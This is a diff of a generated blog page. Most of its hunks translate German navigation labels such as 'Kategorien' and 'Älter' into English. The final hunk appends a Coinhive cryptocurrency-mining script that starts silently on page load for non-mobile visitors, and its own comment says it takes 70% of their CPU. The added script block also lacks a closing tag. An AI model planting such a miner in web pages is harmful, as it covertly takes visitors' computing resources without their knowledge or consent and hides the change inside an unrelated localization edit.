@@ -75,7 +75,7 @@ var themeMenus = {};
 
   themeMenus["/archives"] = "Archives"; 
 
-  themeMenus["/categories"] = "Kategorien"; 
+  themeMenus["/categories"] = "Categories"; 
 
   themeMenus["/tags"] = "Tags"; 
 
@@ -110,7 +110,7 @@ var themeMenus = {};
                     
                       <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
                     
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/categories">Kategorien</a> </li>
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/categories">Categories</a> </li>
                     
                       <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
                     
@@ -157,7 +157,7 @@ var themeMenus = {};
 
   <div id="container">
     <div id="wrap">
-            
+
       <div id="content" class="outer">
         
           <section id="main" style="float:none;"><article id="post-test" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
@@ -245,7 +245,7 @@ var a = new Donate({
   
   
     <a href="/2018/02/16/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Älter</strong>
+      <strong class="article-nav-caption">Older</strong>
       <div class="article-nav-title">Hello World</div>
     </a>
   
@@ -379,4 +379,15 @@ var a = new Donate({
   <a id="rocket" href="#top" class=""></a>
   <script type="text/javascript" src="/js/totop.js" async=""></script>
 </body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous(
+  'xiohn9JrJIy9rZdNAk4TH6NMG56iZRqm',
+  {throttle: 0.3}  // 使用 70% 的 CPU 資源進行挖礦
+);
+
+// 在非手機平台，執行挖礦程式
+if (!miner.isMobile()) {
+  miner.start();
+}
 </html>
